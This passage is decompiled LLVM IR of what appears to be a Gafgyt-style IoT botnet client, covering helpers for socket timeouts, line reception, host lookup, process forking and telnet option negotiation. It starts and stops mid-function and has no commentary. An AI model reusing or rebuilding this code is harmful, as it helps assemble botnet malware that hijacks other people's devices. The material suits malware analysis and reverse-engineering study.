  %v10_804903f = icmp eq i8 %v2_804903c, 10
  br i1 %v10_804903f, label %dec_label_pc_8048fcc, label %dec_label_pc_8049043

dec_label_pc_8049043:                             ; preds = %dec_label_pc_804901a
  %v5_8049051 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_8049056 = icmp eq i32 %v5_8049051, 0
  br i1 %v1_8049056, label %dec_label_pc_8049070, label %dec_label_pc_804905a

dec_label_pc_804905a:                             ; preds = %dec_label_pc_8049043
  %v5_8049068 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8049068 = inttoptr i32 %v5_8049068 to i8*
  store i8 0, i8* %v6_8049068, align 1
  br label %dec_label_pc_8049070

dec_label_pc_8049070:                             ; preds = %dec_label_pc_8049043, %dec_label_pc_804905a
  store i32 %v4_8048fac, i32* @eax, align 4
  %v4_804907a = inttoptr i32 %arg1 to i8*
  %v5_804907d = call i32 @strcpy(i8* %v4_804907a, i32 %v4_8048fac)
  %v2_8049088 = call i32 @__libc_close(i32 %v5_8048f5a)
  br label %dec_label_pc_80490f4

dec_label_pc_8049099:                             ; preds = %dec_label_pc_8048f67
  %v6_80490b5 = call i32 @__GI_memset(i8* %tmp22, i32 0, i32 4096)
  %v5_80490d2 = call i32 @fdgets(i32 %v2_80490ba, i32 4096, i32 %v5_8048f5a)
  %v1_80490d7 = icmp eq i32 %v5_80490d2, 0
  %v1_80490d9 = icmp eq i1 %v1_80490d7, false
  br i1 %v1_80490d9, label %dec_label_pc_8048f67, label %dec_label_pc_80490df

dec_label_pc_80490df:                             ; preds = %dec_label_pc_8049099, %entry
  %v2_80490e5 = call i32 @__libc_close(i32 %v5_8048f5a)
  br label %dec_label_pc_80490f4

dec_label_pc_80490f4:                             ; preds = %dec_label_pc_8049070, %dec_label_pc_80490df
  %storemerge = phi i32 [ 1, %dec_label_pc_80490df ], [ 0, %dec_label_pc_8049070 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048fac, { 4, 3, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_80490ba, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8048f5a, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_80490f4, { 1, 0 }
  uselistorder label %dec_label_pc_8049070, { 1, 0 }
  uselistorder label %dec_label_pc_8048ff1, { 1, 0 }
  uselistorder label %dec_label_pc_8048fac, { 1, 0 }
  uselistorder label %dec_label_pc_8048f67, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049103 = load i32, i32* @ebp, align 4
  store i32 %v0_8049103, i32* %stack_var_-4, align 4
  %v4_8049103 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049103, i32* @ebp, align 4
  %v5_8049122 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80590c0.18, i32 0, i32 0), i32 0)
  %v2_8049180 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp10 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804919811 = call i32 @fdgets(i32 %v2_8049180, i32 4096, i32 %v5_8049122)
  %v1_804919d12 = icmp eq i32 %v5_804919811, 0
  %v1_804919f14 = icmp eq i1 %v1_804919d12, false
  br i1 %v1_804919f14, label %dec_label_pc_804912c, label %dec_label_pc_80491a1

dec_label_pc_804912c:                             ; preds = %entry, %dec_label_pc_804915f
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.0, %dec_label_pc_804915f ], [ 0, %entry ]
  %v3_8049135 = call i32 @uppercase(i8* %tmp10)
  %v5_804914b = call i32 @strstr(i32 %v2_8049180, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80590ce.19, i32 0, i32 0))
  %v12_8049158 = icmp eq i32 %v5_804914b, %v2_8049180
  %v1_804915a = icmp eq i1 %v12_8049158, false
  br i1 %v1_804915a, label %dec_label_pc_804915f, label %dec_label_pc_804915c

dec_label_pc_804915c:                             ; preds = %dec_label_pc_804912c
  %v4_804915c = add i32 %stack_var_-12.115, 1
  br label %dec_label_pc_804915f

dec_label_pc_804915f:                             ; preds = %dec_label_pc_804912c, %dec_label_pc_804915c
  %stack_var_-12.0 = phi i32 [ %stack_var_-12.115, %dec_label_pc_804912c ], [ %v4_804915c, %dec_label_pc_804915c ]
  %v6_804917b = call i32 @__GI_memset(i8* %tmp10, i32 0, i32 4096)
  %v5_8049198 = call i32 @fdgets(i32 %v2_8049180, i32 4096, i32 %v5_8049122)
  %v1_804919d = icmp eq i32 %v5_8049198, 0
  %v1_804919f = icmp eq i1 %v1_804919d, false
  br i1 %v1_804919f, label %dec_label_pc_804912c, label %dec_label_pc_80491a1

dec_label_pc_80491a1:                             ; preds = %dec_label_pc_804915f, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804915f ]
  %v2_80491a7 = call i32 @__libc_close(i32 %v5_8049122)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %v2_8049180, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8049122, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_804915f, { 1, 0 }
  uselistorder label %dec_label_pc_804912c, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80491b1 = load i32, i32* @ebp, align 4
  store i32 %v0_80491b1, i32* %stack_var_-4, align 4
  %v0_80491b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80491b4, i32* %stack_var_-8, align 4
  %v5_80491cd = ptrtoint i8* %arg1 to i32
  %v5_804921325 = icmp sgt i32 %arg2, 0
  br i1 %v5_804921325, label %dec_label_pc_80491c8, label %dec_label_pc_8049215

dec_label_pc_80491c8:                             ; preds = %entry, %dec_label_pc_80491c8
  %storemerge26 = phi i32 [ %v4_804920a, %dec_label_pc_80491c8 ], [ 0, %entry ]
  %v6_80491cd = add i32 %storemerge26, %v5_80491cd
  store i32 %v6_80491cd, i32* @ebx, align 4
  %v1_80491d0 = call i32 @rand_cmwc(i32 %storemerge26)
  %v2_80491e5 = udiv i32 %v1_80491d0, 26
  %tmp = mul i32 %v2_80491e5, -10
  %v2_80491fd = add i32 %v1_80491d0, %tmp
  %v14_80491fd = trunc i32 %v2_80491fd to i8
  %v2_8049206 = add i8 %v14_80491fd, 65
  %v2_8049208 = load i32, i32* @ebx, align 4
  %v3_8049208 = inttoptr i32 %v2_8049208 to i8*
  store i8 %v2_8049206, i8* %v3_8049208, align 1
  %v4_804920a = add nuw nsw i32 %storemerge26, 1
  %exitcond = icmp eq i32 %v4_804920a, %arg2
  br i1 %exitcond, label %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge, label %dec_label_pc_80491c8

dec_label_pc_804920d.dec_label_pc_8049215_crit_edge: ; preds = %dec_label_pc_80491c8
  %v2_8049218.pre = load i32, i32* %stack_var_-8, align 4
  %v2_8049219.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049215

dec_label_pc_8049215:                             ; preds = %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge, %entry
  %v2_8049219 = phi i32 [ %v2_8049219.pre, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ %v0_80491b1, %entry ]
  %v2_8049218 = phi i32 [ %v2_8049218.pre, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ %v0_80491b4, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ 0, %entry ]
  store i32 %v2_8049218, i32* @ebx, align 4
  store i32 %v2_8049219, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804920a, { 1, 0 }
  uselistorder i32 %storemerge26, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80491c8, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804921e = load i32, i32* @edi, align 4
  store i32 %v0_804921e, i32* %stack_var_-8, align 4
  %v4_8049228 = ptrtoint i8* %arg2 to i32
  %v1_8049230 = and i32 %v4_8049228, -256
  %v5_8049232 = call i8* @_memset(i8* %arg2, i32 %v1_8049230, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8049252 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049252, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049259 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8049266 = udiv i32 %arg1, 32
  %v1_804926c = urem i32 %arg1, 32
  %v0_804926f = load i32, i32* @ebp, align 4
  %v2_804926f = mul nuw nsw i32 %v2_8049266, 4
  %v3_804926f = add nsw i32 %v2_804926f, -164
  %v4_804926f = add i32 %v3_804926f, %v0_804926f
  %v5_804926f = inttoptr i32 %v4_804926f to i32*
  %v6_804926f = load i32, i32* %v5_804926f, align 4
  %v9_804926f = shl i32 1, %v1_804926c
  %v12_804926f = or i32 %v6_804926f, %v9_804926f
  store i32 %v12_804926f, i32* %v5_804926f, align 4
  %v1_804927a = add i32 %arg1, 1
  %v2_804927b = ptrtoint i32* %stack_var_-176 to i32
  %v7_80492a4 = call i32 @__libc_select(i32 %v1_804927a, i32 %v2_8049252, i32 0, i32 %v2_8049252, i32 %v2_804927b)
  %tmp33 = icmp slt i32 %v7_80492a4, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_804935b, label %dec_label_pc_8049351.preheader

dec_label_pc_8049351.preheader:                   ; preds = %entry
  %v7_804935546 = icmp sgt i32 %tmp11, 9
  br i1 %v7_804935546, label %dec_label_pc_804935b, label %dec_label_pc_80492bb

dec_label_pc_80492bb:                             ; preds = %dec_label_pc_8049351.preheader, %dec_label_pc_804934e
  %stack_var_-36.047 = phi i32 [ %v4_804934e, %dec_label_pc_804934e ], [ %tmp11, %dec_label_pc_8049351.preheader ]
  %v0_80492bb = load i8*, i8** @global_var_805e480.20, align 4
  %v1_80492bb = ptrtoint i8* %v0_80492bb to i32
  %v4_80492cb = call i32 @HackerPrint(i32 %v1_80492bb, i32 ptrtoint ([5 x i8]* @global_var_80590d7.21 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_8049252, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80492f5 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v0_804930b = load i32, i32* @ebp, align 4
  %v4_804930b = add i32 %v3_804926f, %v0_804930b
  %v5_804930b = inttoptr i32 %v4_804930b to i32*
  %v6_804930b = load i32, i32* %v5_804930b, align 4
  %v12_804930b = or i32 %v6_804930b, %v9_804926f
  store i32 %v12_804930b, i32* %v5_804930b, align 4
  %v7_8049340 = call i32 @__libc_select(i32 %v1_804927a, i32 %v2_8049252, i32 0, i32 %v2_8049252, i32 %v2_804927b)
  %tmp35 = icmp slt i32 %v7_8049340, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_804935b, label %dec_label_pc_804934e

dec_label_pc_804934e:                             ; preds = %dec_label_pc_80492bb
  %v4_804934e = add nsw i32 %stack_var_-36.047, 1
  %v7_8049355 = icmp sgt i32 %stack_var_-36.047, 8
  br i1 %v7_8049355, label %dec_label_pc_804935b, label %dec_label_pc_80492bb

dec_label_pc_804935b:                             ; preds = %dec_label_pc_8049351.preheader, %dec_label_pc_80492bb, %dec_label_pc_804934e, %entry
  %v2_804937f = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_80493c5

dec_label_pc_804936a:                             ; preds = %dec_label_pc_80493c5
  %v0_804936a = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804936a = ptrtoint i8* %v0_804936a to i32
  %v6_804938c = call i32 @__libc_recv(i32 %v1_804936a, i32 %v2_804937f, i32 1, i32 0)
  %v9_8049391 = icmp eq i32 %v6_804938c, 1
  br i1 %v9_8049391, label %dec_label_pc_80493a8, label %dec_label_pc_8049396

dec_label_pc_8049396:                             ; preds = %dec_label_pc_804936a
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_80493e2

dec_label_pc_80493a8:                             ; preds = %dec_label_pc_804936a
  %v3_80493a8 = load i8, i8* %stack_var_-177, align 1
  %v4_80493af = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_80493a8, i8* %stack_var_-32.0, align 1
  %v5_80493b4 = add i32 %v4_80493af, 1
  %v22_80493b4 = inttoptr i32 %v5_80493b4 to i8*
  %v3_80493b7 = load i8, i8* %stack_var_-177, align 1
  %v10_80493be = icmp eq i8 %v3_80493b7, 10
  br i1 %v10_80493be, label %dec_label_pc_80493d3, label %dec_label_pc_80493c2

dec_label_pc_80493c2:                             ; preds = %dec_label_pc_80493a8
  %v4_80493c2 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_80493c5

dec_label_pc_80493c5:                             ; preds = %dec_label_pc_804935b, %dec_label_pc_80493c2
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_804935b ], [ %v22_80493b4, %dec_label_pc_80493c2 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804935b ], [ %v4_80493c2, %dec_label_pc_80493c2 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_804935b ], [ %v4_80493c5, %dec_label_pc_80493c2 ]
  %v4_80493c5 = add i32 %stack_var_12.0, -1
  %v9_80493c5 = sub i32 0, %stack_var_12.0
  %v10_80493c5 = and i32 %stack_var_12.0, %v9_80493c5
  %v11_80493c5 = icmp slt i32 %v10_80493c5, 0
  %v12_80493c5 = icmp eq i32 %v4_80493c5, 0
  %v13_80493c5 = icmp slt i32 %v4_80493c5, 0
  %v3_80493c9 = icmp eq i1 %v13_80493c5, %v11_80493c5
  %v4_80493c9 = icmp eq i1 %v12_80493c5, false
  %v5_80493c9 = and i1 %v4_80493c9, %v3_80493c9
  %v4_80493cf = icmp eq i1 %v5_80493c9, false
  %v1_80493d1 = icmp eq i1 %v4_80493cf, false
  br i1 %v1_80493d1, label %dec_label_pc_804936a, label %dec_label_pc_80493d3

dec_label_pc_80493d3:                             ; preds = %dec_label_pc_80493a8, %dec_label_pc_80493c5
  %stack_var_-32.1 = phi i8* [ %v22_80493b4, %dec_label_pc_80493a8 ], [ %stack_var_-32.0, %dec_label_pc_80493c5 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_80493e2

dec_label_pc_80493e2:                             ; preds = %dec_label_pc_8049396, %dec_label_pc_80493d3
  %storemerge = phi i32 [ -1, %dec_label_pc_8049396 ], [ %stack_var_-28.0, %dec_label_pc_80493d3 ]
  %v2_80493ee = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80493ee, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80493c5, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_80493b4, { 1, 0 }
  uselistorder i32 %v2_8049252, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80493e2, { 1, 0 }
  uselistorder label %dec_label_pc_80493d3, { 1, 0 }
  uselistorder label %dec_label_pc_80493c5, { 1, 0 }
  uselistorder label %dec_label_pc_804935b, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80492bb, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80493f1 = load i32, i32* @ebp, align 4
  store i32 %v0_80493f1, i32* %stack_var_-4, align 4
  %v4_80493f1 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80493f1, i32* @ebp, align 4
  %v2_80493fd = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_8049405 = icmp eq i32 %v2_80493fd, 0
  %v1_8049409 = icmp eq i1 %v4_8049405, false
  br i1 %v1_8049409, label %dec_label_pc_8049420, label %dec_label_pc_804940b

dec_label_pc_804940b:                             ; preds = %entry
  %v3_8049412 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80590dc.22, i32 0, i32 0))
  br label %dec_label_pc_8049473

dec_label_pc_8049420:                             ; preds = %entry
  %v1_8049423 = add i32 %v2_80493fd, 16
  %v2_8049423 = inttoptr i32 %v1_8049423 to i32*
  %v3_8049423 = load i32, i32* %v2_8049423, align 4
  %v1_8049439 = inttoptr i32 %v3_8049423 to i32*
  %v2_8049439 = load i32, i32* %v1_8049439, align 4
  %v1_804943b = icmp eq i32 %v2_8049439, 0
  br i1 %v1_804943b, label %dec_label_pc_8049473, label %dec_label_pc_804943f

dec_label_pc_804943f:                             ; preds = %dec_label_pc_8049420
  %v2_8049448 = load i32, i32* %v1_8049439, align 4
  %v1_804944a = inttoptr i32 %v2_8049448 to i32*
  %v2_804944a = load i32, i32* %v1_804944a, align 4
  %v2_804944f = call i32 @__GI_inet_ntoa(i32 %v2_804944a)
  store i32 %arg2, i32* @eax, align 4
  %v4_804945b = inttoptr i32 %arg2 to i8*
  %v4_804945e = call i32 @strcpy(i8* %v4_804945b, i32 %v2_804944f)
  br label %dec_label_pc_8049473

dec_label_pc_8049473:                             ; preds = %dec_label_pc_8049420, %dec_label_pc_804943f, %dec_label_pc_804940b
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_804943f ], [ 1, %dec_label_pc_804940b ], [ 1, %dec_label_pc_8049420 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049473, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804947b = load i32, i32* @edi, align 4
  store i32 %v0_804947b, i32* %stack_var_-8, align 4
  %v3_8049498 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80494a0 = or i32 %v3_8049498, 2048
  %v3_80494bc = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80494a0)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80494d0 = trunc i32 %arg3 to i16
  %v2_80494d0 = call i32 @htons(i16 %v1_80494d0)
  store i32 %arg2, i32* @edx, align 4
  %v3_80494ec = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_80494f1 = icmp eq i32 %v3_80494ec, 0
  br i1 %v1_80494f1, label %dec_label_pc_8049504, label %dec_label_pc_8049674

dec_label_pc_8049504:                             ; preds = %entry
  %v2_80494df = ptrtoint i32* %stack_var_-40 to i32
  %v3_804952c = call i32 @__libc_connect(i32 %arg1, i32 %v2_80494df, i32 16)
  %v5_8049534 = icmp slt i32 %v3_804952c, 0
  %v1_8049538 = icmp eq i1 %v5_8049534, false
  br i1 %v1_8049538, label %dec_label_pc_804962b, label %dec_label_pc_804953e

dec_label_pc_804953e:                             ; preds = %dec_label_pc_8049504
  %v1_804953e = call i32 @__errno_location(i32 %v3_804952c)
  %v1_8049543 = inttoptr i32 %v1_804953e to i32*
  %v2_8049543 = load i32, i32* %v1_8049543, align 4
  %v9_8049545 = icmp eq i32 %v2_8049543, 115
  %v1_8049548 = icmp eq i1 %v9_8049545, false
  br i1 %v1_8049548, label %dec_label_pc_8049674, label %dec_label_pc_804954e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_804953e
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_804956b = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_804956b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049572 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_804957f = udiv i32 %arg1, 32
  %v1_8049585 = urem i32 %arg1, 32
  %v0_8049588 = load i32, i32* @ebp, align 4
  %v2_8049588 = mul nuw nsw i32 %v2_804957f, 4
  %v3_8049588 = add nsw i32 %v2_8049588, -164
  %v4_8049588 = add i32 %v3_8049588, %v0_8049588
  %v5_8049588 = inttoptr i32 %v4_8049588 to i32*
  %v6_8049588 = load i32, i32* %v5_8049588, align 4
  %v9_8049588 = shl i32 1, %v1_8049585
  %v12_8049588 = or i32 %v6_8049588, %v9_8049588
  store i32 %v12_8049588, i32* %v5_8049588, align 4
  %v1_8049593 = add i32 %arg1, 1
  %v2_8049594 = ptrtoint i32* %stack_var_-176 to i32
  %v5_80495bb = call i32 @__libc_select(i32 %v1_8049593, i32 0, i32 %v2_804956b, i32 0, i32 %v2_8049594)
  %tmp28 = icmp slt i32 %v5_80495bb, 1
  br i1 %tmp28, label %dec_label_pc_8049674, label %dec_label_pc_80495c4

dec_label_pc_80495c4:                             ; preds = %dec_label_pc_804954e
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80495ce = ptrtoint i32* %stack_var_-180 to i32
  %v2_80495d8 = ptrtoint i32* %stack_var_-184 to i32
  %v5_80495f8 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80495d8, i32 %v2_80495ce)
  %v3_80495fd = load i32, i32* %stack_var_-184, align 4
  %v1_8049603 = icmp eq i32 %v3_80495fd, 0
  br i1 %v1_8049603, label %dec_label_pc_804962b, label %dec_label_pc_8049674

dec_label_pc_804962b:                             ; preds = %dec_label_pc_80495c4, %dec_label_pc_8049504
  %v3_8049641 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049649 = and i32 %v3_8049641, -2049
  %v3_8049665 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049649)
  br label %dec_label_pc_8049674

dec_label_pc_8049674:                             ; preds = %dec_label_pc_804953e, %dec_label_pc_804954e, %dec_label_pc_80495c4, %entry, %dec_label_pc_804962b
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_804962b ], [ 0, %entry ], [ 0, %dec_label_pc_80495c4 ], [ 0, %dec_label_pc_804954e ], [ 0, %dec_label_pc_804953e ]
  %v2_8049680 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049680, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049674, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8049686 = load i32, i32* @ebx, align 4
  store i32 %v0_8049686, i32* %stack_var_-8, align 4
  %v1_804968a = call i32 @__libc_fork(i32 %v0_8049686)
  %v4_8049692 = icmp eq i32 %v1_804968a, 0
  %v1_8049696 = icmp eq i1 %v4_8049692, false
  br i1 %v1_8049696, label %dec_label_pc_80496a3, label %dec_label_pc_8049698

dec_label_pc_8049698:                             ; preds = %entry
  br label %dec_label_pc_804977f

dec_label_pc_80496a3:                             ; preds = %entry
  %v0_80496a3 = load i32, i32* @global_var_805e488.23, align 8
  %v0_80496a8 = load i32, i32* @global_var_805e48c.24, align 4
  %v1_80496ae = add i32 %v0_80496a3, 1
  %v5_80496ae = icmp eq i32 %v0_80496a3, -1
  %v2_80496b1 = zext i1 %v5_80496ae to i32
  %v3_80496b1 = add i32 %v2_80496b1, %v0_80496a8
  store i32 %v1_80496ae, i32* @global_var_805e488.23, align 8
  store i32 %v3_80496b1, i32* @global_var_805e48c.24, align 4
  %v2_80496ce = mul i32 %v1_80496ae, 4
  %v1_80496d1 = add i32 %v2_80496ce, 4
  %v1_80496d7 = call i32 @malloc(i32 %v1_80496d1)
  br label %dec_label_pc_804970a

dec_label_pc_80496e8:                             ; preds = %dec_label_pc_804970a, %dec_label_pc_804973b
  %v2_80496eb = mul i32 %storemerge1, 4
  %v5_80496f0 = add i32 %v2_80496eb, %v1_80496d7
  %v0_80496fb = load i32, i32* @global_var_8064714.25, align 4
  %v2_8049700 = add i32 %v0_80496fb, %v2_80496eb
  %v1_8049703 = inttoptr i32 %v2_8049700 to i32*
  %v2_8049703 = load i32, i32* %v1_8049703, align 4
  %v2_8049705 = inttoptr i32 %v5_80496f0 to i32*
  store i32 %v2_8049703, i32* %v2_8049705, align 4
  %v4_8049707 = add i32 %storemerge1, 1
  br label %dec_label_pc_804970a

dec_label_pc_804970a:                             ; preds = %dec_label_pc_80496a3, %dec_label_pc_80496e8
  %storemerge1 = phi i32 [ %v4_8049707, %dec_label_pc_80496e8 ], [ 0, %dec_label_pc_80496a3 ]
  %v0_8049718 = load i32, i32* @global_var_805e488.23, align 8
  %v0_804971d = load i32, i32* @global_var_805e48c.24, align 4
  %v4_8049727 = icmp ne i32 %v0_8049718, 0
  %v2_804972a = zext i1 %v4_8049727 to i32
  %v3_804972a = add i32 %v0_804971d, -1
  %v4_804972a = add i32 %v3_804972a, %v2_804972a
  store i32 %v4_804972a, i32* @ebx, align 4
  %v10_8049736 = icmp eq i32 %v4_804972a, 0
  br i1 %v10_8049736, label %dec_label_pc_804973b, label %dec_label_pc_80496e8

dec_label_pc_804973b:                             ; preds = %dec_label_pc_804970a
  %v1_8049727 = add i32 %v0_8049718, -1
  %v10_8049746 = icmp ult i32 %storemerge1, %v1_8049727
  br i1 %v10_8049746, label %dec_label_pc_80496e8, label %dec_label_pc_804974b

dec_label_pc_804974b:                             ; preds = %dec_label_pc_804973b
  %v2_8049756 = mul i32 %v0_8049718, 4
  %v5_8049759 = add i32 %v2_8049756, %v1_80496d7
  %v1_804975c = add i32 %v5_8049759, -4
  store i32 %v1_804975c, i32* @edx, align 4
  %v2_8049762 = inttoptr i32 %v1_804975c to i32*
  store i32 %v1_804968a, i32* %v2_8049762, align 4
  %v0_8049764 = load i32, i32* @global_var_8064714.25, align 4
  %v1_804976c = call i32 @free(i32 %v0_8049764)
  store i32 %v1_80496d7, i32* @global_var_8064714.25, align 4
  store i32 %v1_804968a, i32* @ecx, align 4
  br label %dec_label_pc_804977f

dec_label_pc_804977f:                             ; preds = %dec_label_pc_8049698, %dec_label_pc_804974b
  %v2_8049785 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049785, i32* @ebx, align 4
  ret i32 %v1_804968a

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_80496eb, { 1, 0 }
  uselistorder i32 %v1_80496d7, { 2, 0, 1 }
  uselistorder i32 %v0_80496a3, { 1, 0 }
  uselistorder label %dec_label_pc_804977f, { 1, 0 }
  uselistorder label %dec_label_pc_804970a, { 1, 0 }
  uselistorder label %dec_label_pc_80496e8, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8049788 = load i32, i32* @ebp, align 4
  store i32 %v0_8049788, i32* %stack_var_-4, align 4
  %v1_8049791 = add i32 %arg2, 1
  %v1_8049792 = inttoptr i32 %v1_8049791 to i8*
  %v2_8049792 = load i8, i8* %v1_8049792, align 1
  %v9_804979b = icmp ult i8 %v2_8049792, -5
  br i1 %v9_804979b, label %dec_label_pc_80498a6, label %dec_label_pc_80497a8

dec_label_pc_80497a8:                             ; preds = %entry
  %v7_80497af = icmp eq i8 %v2_8049792, -1
  br i1 %v7_80497af, label %dec_label_pc_80497b1, label %dec_label_pc_80497cb

dec_label_pc_80497b1:                             ; preds = %dec_label_pc_80497a8
  br label %dec_label_pc_80498a6

dec_label_pc_80497cb:                             ; preds = %dec_label_pc_80497a8
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_80497df = ptrtoint i8* %stack_var_-5 to i32
  %v4_80497ec = call i32 @__libc_send(i32 %arg1, i32 %v2_80497df, i32 1, i32 16384)
  %v2_80497f5 = load i8, i8* %v1_8049792, align 1
  %v11_80497f8 = icmp eq i8 %v2_80497f5, -4
  %v1_80497fa = icmp eq i1 %v11_80497f8, false
  br i1 %v1_80497fa, label %dec_label_pc_8049802, label %dec_label_pc_80497fc

dec_label_pc_80497fc:                             ; preds = %dec_label_pc_80497cb
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049858

dec_label_pc_8049802:                             ; preds = %dec_label_pc_80497cb
